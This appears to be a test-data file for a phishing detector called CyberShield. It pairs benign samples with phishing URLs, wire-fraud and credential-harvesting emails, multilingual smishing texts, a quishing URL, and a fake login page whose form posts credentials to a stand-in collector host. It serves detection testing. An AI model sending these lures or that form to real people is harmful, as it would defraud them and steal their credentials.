# 🧪 CyberShield — Comprehensive Example Test Data (`data.md`)

This document provides a complete library of copy-paste-ready test cases for evaluating **CyberShield** across all 4 input modes (**URLs**, **Raw Emails**, **SMS / Chat Messages**, and **QR Codes / Webpages**).

Each scenario includes the **Input Content**, the **Target Engine Triggers**, and the **Expected Verdict / Score**.

---

## 📑 Table of Contents

1. [🔗 URL Test Cases](#1--url-test-cases)
   - [A. Safe / Benign URLs](#a-safe--benign-urls)
   - [B. Malicious / Phishing URLs](#b-malicious--phishing-urls)
2. [📧 Raw Email Test Cases](#2--raw-email-test-cases)
   - [A. Safe / Benign Emails](#a-safe--benign-emails)
   - [B. Executive BEC & Wire Fraud Emails](#b-executive-bec--wire-fraud-emails)
   - [C. Organizational Consent & Document Sharing Phishing](#c-organizational-consent--document-sharing-phishing)
   - [D. Account Security & Password Reset Phishing](#d-account-security--password-reset-phishing)
3. [💬 SMS & Chat Message Test Cases (Smishing)](#3--sms--chat-message-test-cases-smishing)
   - [A. Safe / Normal Messages](#a-safe--normal-messages)
   - [B. English Smishing Attacks](#b-english-smishing-attacks)
   - [C. Indian Regional Language Smishing (Telugu, Hindi, Tamil, Marathi, Bengali)](#c-indian-regional-language-smishing)
   - [D. International Language Smishing (Spanish)](#d-international-language-smishing)
4. [📷 QR Code (Quishing) & Webpage DOM Payloads](#4--qr-code-quishing--webpage-dom-payloads)

---

## 1. 🔗 URL Test Cases

### A. Safe / Benign URLs

#### 1. Google Search
```text
https://www.google.com
```
- **Expected Score**: `0 – 5 / 100` (`SAFE` 🟢 | Action: `ALLOW`)
- **Reason**: Top verified root domain, valid SSL, clean threat intelligence records.

#### 2. Wikipedia Article
```text
https://en.wikipedia.org/wiki/Main_Page
```
- **Expected Score**: `0 – 5 / 100` (`SAFE` 🟢 | Action: `ALLOW`)
- **Reason**: Legitimate educational domain, standard URI structure.

#### 3. GitHub Repository
```text
https://github.com/torvalds/linux
```
- **Expected Score**: `0 – 5 / 100` (`SAFE` 🟢 | Action: `ALLOW`)
- **Reason**: Verified developer platform domain.

#### 4. Microsoft Office Portal
```text
https://www.office.com
```
- **Expected Score**: `0 – 5 / 100` (`SAFE` 🟢 | Action: `ALLOW`)

---

### B. Malicious / Phishing URLs

#### 1. Apple iCloud Typosquatting / Homoglyph
```text
http://br-icloud.com.br/login.php
```
- **Expected Score**: `85 – 95 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)
- **Engine Triggers**:
  - **Rule Engine**: Brand keyword spoofing (`icloud`) on mismatched registered domain (`br-icloud.com.br`).
  - **NLP Engine**: Typosquat character-boundary probability $\ge 66\%$.
  - **Threat Intel**: Verified PhishTank / URLhaus blacklist hit.

#### 2. PayPal Credential Harvesting on Free TLD
```text
https://paypal-verify-account.xyz/login
```
- **Expected Score**: `85 – 95 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)
- **Engine Triggers**: Compound brand impersonation + high-risk `.xyz` TLD + credential keyword (`login`).

#### 3. Direct IP Address Host (Evading Domain Reputation)
```text
http://192.168.1.105:8080/secure/bank/login.html
```
- **Expected Score**: `80 – 90 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)
- **Engine Triggers**: Raw IPv4 host + non-standard port (`8080`) + financial keyword (`bank/login`).

#### 4. Cryptocurrency Wallet Seed Recovery Phishing
```text
http://wallet-recovery.example.com/restore?seed=required
```
- **Expected Score**: `85 – 95 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)
- **Engine Triggers**: NLP semantic intent flags private key/seed phrase extraction.

#### 5. Netflix Billing Suspension Scam
```text
http://netflix-billing-update.top/account/verify
```
- **Expected Score**: `85 – 95 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)
- **Engine Triggers**: Suspicious `.top` TLD + Netflix brand spoofing + urgency path.

---

## 2. 📧 Raw Email Test Cases

*(Copy and paste the entire block into the **Email Analyzer** tab)*

### A. Safe / Benign Emails

#### 1. Internal Team Sprint Planning
```text
From: sarah.jenkins@company.com
Subject: Sprint Planning & Q3 Roadmap Review
Date: Fri, 29 Aug 2026 10:00:00 +0000

Hi Team,

Just a reminder that our bi-weekly sprint planning session is scheduled for today at 2:00 PM in Conference Room B and via Google Meet.

Please make sure all your backlog tickets in Jira are updated with latest story points before the call.

Best regards,
Sarah Jenkins
Engineering Lead
```
- **Expected Score**: `0 – 5 / 100` (`SAFE` 🟢 | Action: `ALLOW`)
- **Reason**: Standard business collaboration language, consistent internal headers, zero financial pressure.

#### 2. IT Service Desk Maintenance Notification
```text
From: it-support@internal-corp.com
Subject: Scheduled Maintenance Window: Saturday 10 PM EST

Hello All,

This is an automated notification regarding scheduled server maintenance this Saturday from 10:00 PM to 2:00 AM EST. Internal network drives and VPN services may experience brief interruptions.

No action is required from your side. If you experience issues on Monday, please raise a ticket in the employee portal.

Regards,
IT Infrastructure Operations
```
- **Expected Score**: `0 – 5 / 100` (`SAFE` 🟢 | Action: `ALLOW`)

---

### B. Executive BEC & Wire Fraud Emails

#### 1. Urgent CEO Wire Transfer Request
```text
From: "David Marcus - CEO" <ceo.office.corp1@gmail.com>
Reply-To: executive-wire-desk@mail-secure.xyz
Subject: URGENT: Confidential Acquisition Wire Payment Required Today

Hello,

I am currently in an all-day executive board meeting with our legal counsel regarding an off-market company acquisition. 

I need you to process an urgent wire transfer of $48,500 to our external escrow vendor before 4:00 PM today to finalize the contract. 

Wiring instructions:
Bank: First Metro Commercial
Account: 9482-1049-2810
Routing: 021000021

Do not call my personal phone as I cannot take calls during the meeting. Confirm once the wire transfer is executed.

Regards,
David Marcus
Chief Executive Officer
```
- **Expected Score**: `85 – 95 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)
- **Engine Triggers**:
  - **Rule Engine**: Executive display-name spoofing (`CEO` using generic `@gmail.com` with mismatched `Reply-To`).
  - **NLP Engine**: Urgent wire payment solicitation + anti-verification command (*"Do not call my personal phone"*).

---

### C. Organizational Consent & Document Sharing Phishing

#### 1. Document Access Review & Credential Harvesting
```text
From: notifications@example.test
Reply-To: document-support@example.test
Subject: Secure Document Shared: Q3_Account_Review.pdf

Hello,

A document associated with your account was recently shared with you through the organization’s document portal.

Document: Q3_Account_Review.pdf
Shared by: Finance Operations
Access status: Awaiting confirmation

You can review the document and confirm access using the secure document portal below:
https://document-access.example.test/confirm

For verification, you may be asked to sign in using your organization credentials.

If you were not expecting this document, please do not forward this message. Contact the service desk through your usual internal channel.

Regards,
Document Services
Automated Notification System
```
- **Expected Score**: `80 – 90 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)
- **Engine Triggers**:
  - **NLP Engine**: Solicits organizational credential sign-in (`"sign in using your organization credentials"`).
  - **Rule Engine**: Untrusted document confirmation link with credential harvesting lure.

---

### D. Account Security & Password Reset Phishing

#### 1. Microsoft 365 Password Expiry Lure
```text
From: "Microsoft Security Team" <admin@m365-security-portal.top>
Subject: Action Required: Your Office365 Password Expires in 2 Hours

Dear User,

Your corporate Office365 email password is set to expire today at 12:00 PM. Failure to validate your credentials will result in immediate mailbox suspension and loss of unread emails.

Keep your current password by confirming your account details:
https://login-microsoftonline.m365-security-portal.top/auth/update

Microsoft Corporation, One Microsoft Way, Redmond, WA
```
- **Expected Score**: `85 – 95 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)
- **Engine Triggers**:
  - **Rule Engine**: Subdomain brand spoofing (`login-microsoftonline` on `.top` TLD).
  - **NLP Engine**: Extreme time pressure urgency (*"expires in 2 hours"*, *"immediate suspension"*).

---

## 3. 💬 SMS & Chat Message Test Cases (Smishing)

*(Copy and paste into the **Message Analyzer** tab)*

### A. Safe / Normal Messages

#### 1. Meeting Reminder
```text
Hey Alex, are we still meeting for lunch at 12:30 PM near the cafeteria? Let me know!
```
- **Expected Score**: `0 – 5 / 100` (`SAFE` 🟢 | Action: `ALLOW`)

#### 2. User-Initiated Two-Factor OTP
```text
Your verification code is 849201. Valid for 5 minutes. Do not share this code with anyone.
```
- **Expected Score**: `0 – 5 / 100` (`SAFE` 🟢 | Action: `ALLOW`)

---

### B. English Smishing Attacks

#### 1. State Bank KYC Account Block Warning
```text
Dear Customer, Your SBI NetBanking account has been suspended due to incomplete KYC verification. Click here immediately to update your Aadhaar and PAN details: http://sbi-kyc-update.xyz/verify to prevent permanent deactivation.
```
- **Expected Score**: `85 – 95 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)
- **Engine Triggers**: High-urgency deactivation threat + PAN/Aadhaar/KYC harvesting + `.xyz` scam link.

#### 2. Electricity Power Cut Off Scam
```text
Dear Consumer, Your electricity power supply will be disconnected tonight at 9:30 PM because your previous month bill was not updated. Please immediately call our electricity officer at 9876543210 or pay bill here: http://bit.ly/electricity-bill-pay
```
- **Expected Score**: `80 – 90 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)
- **Engine Triggers**: Disconnection threat + urgency + suspicious shortened URL.

---

### C. Indian Regional Language Smishing

*(CyberShield automatically normalizes, translates, and detects threats in regional Indian languages)*

#### 1. Telugu (తెలుగు) — Bank Account Block Scam
```text
ప్రియమైన వినియోగదారు, మీ SBI బ్యాంక్ ఖాతా నిలిపివేయబడింది. తక్షణమే మీ పాన్ మరియు ఆధార్ వివరాలను అప్‌డేట్ చేయండి: http://sbi-telugu-update.xyz/login లేకుంటే మీ ఖాతా రద్దు చేయబడుతుంది.
```
- **Translation**: *"Dear customer, your SBI bank account has been suspended. Immediately update your PAN and Aadhaar details... or your account will be canceled."*
- **Expected Score**: `85 – 95 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)

#### 2. Hindi (हिंदी) — Bank Account KYC Scam
```text
प्रिय ग्राहक, आपका बैंक खाता आज रात ब्लॉक कर दिया जाएगा क्योंकि आपका KYC पूरा नहीं है। खाता चालू रखने के लिए तुरंत इस लिंक पर क्लिक करके अपना आधार नंबर दर्ज करें: http://pnb-kyc-sewa.top/login
```
- **Translation**: *"Dear customer, your bank account will be blocked tonight because your KYC is incomplete. Enter Aadhaar number immediately..."*
- **Expected Score**: `85 – 95 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)

#### 3. Tamil (தமிழ்) — Electricity Disconnection Scam
```text
அன்புள்ள வாடிக்கையாளரே, உங்களின் மின்சார கட்டணம் செலுத்தப்படாததால் இன்று இரவு 9:00 மணிக்கு மின் இணைப்பு துண்டிக்கப்படும். உடனே கட்டணம் செலுத்த: http://tnebl-pay.xyz/bill
```
- **Translation**: *"Dear customer, power connection will be disconnected at 9:00 PM tonight due to unpaid bill. Pay immediately at..."*
- **Expected Score**: `85 – 95 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)

#### 4. Marathi (मराठी) — Lottery Prize Claim Fraud
```text
अभिनंदन! तुम्ही ५० लाख रुपयांची लॉटरी जिंकली आहे. तुमचे बक्षीस क्लेम करण्यासाठी त्वरित तुमचा बँक खाते क्रमांक आणि OTP येथे सबमिट करा: http://lottery-claim.top/win
```
- **Translation**: *"Congratulations! You have won 50 Lakh rupees lottery. Submit your bank account number and OTP here to claim prize..."*
- **Expected Score**: `85 – 95 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)

#### 5. Bengali (বাংলা) — Reward Point Expiry Scam
```text
প্রিয় গ্রাহক, আপনার ১০,০০০ টাকা রিওয়ার্ড পয়েন্ট আজ মধ্যরাতে মেয়াদ শেষ হচ্ছে। টাকা আপনার একাউন্টে তুলতে অবিলম্বে লগইন করুন: http://reward-cashback.xyz/redeem
```
- **Translation**: *"Dear customer, your 10,000 reward points expire at midnight. Login immediately to withdraw money to your account..."*
- **Expected Score**: `85 – 95 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)

---

### D. International Language Smishing

#### 1. Spanish (Español) — Banking Suspension Notice
```text
Estimado cliente, su cuenta bancaria ha sido bloqueada temporalmente por actividad sospechosa. Para desbloquear su acceso, verifique su identidad en: http://banco-seguro-verificar.xyz/auth
```
- **Translation**: *"Dear customer, your bank account has been temporarily blocked for suspicious activity. To unblock, verify your identity at..."*
- **Expected Score**: `85 – 95 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)

---

## 4. 📷 QR Code (Quishing) & Webpage DOM Payloads

### A. Quishing QR Destination URL
- **Decoded QR Text**: `https://parking-meter-quickpay.xyz/checkout?id=8492`
- **Expected Score**: `85 – 95 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)
- **Analysis**: Unofficial payment gateway impersonating municipal parking meters.

---

### B. Malicious Webpage DOM Structure (Behavior Engine Inspection)
```html
<!DOCTYPE html>
<html>
<head><title>Sign In - Secure Corporate Portal</title></head>
<body>
  <!-- Fake Login Form with cross-domain data exfiltration -->
  <form action="http://malicious-collector.xyz/steal_credentials.php" method="POST">
    <h2>Enter Your Microsoft / Corporate Credentials</h2>
    <input type="email" name="username" placeholder="Company Email" required />
    <input type="password" name="password" placeholder="Password" required />
    <button type="submit">Verify Identity</button>
  </form>

  <!-- Hidden zero-pixel iframe tracking user session -->
  <iframe src="http://tracker-endpoint.xyz/session" width="0" height="0" style="display:none;"></iframe>
</body>
</html>
```
- **Expected Score**: `85 – 95 / 100` (`CRITICAL` 🔴 | Action: `REPORT`)
- **Engine Triggers**:
  - **Behavior Engine**: Password input transmitted over unencrypted HTTP + cross-origin form action (`malicious-collector.xyz`) + zero-pixel hidden iframe.

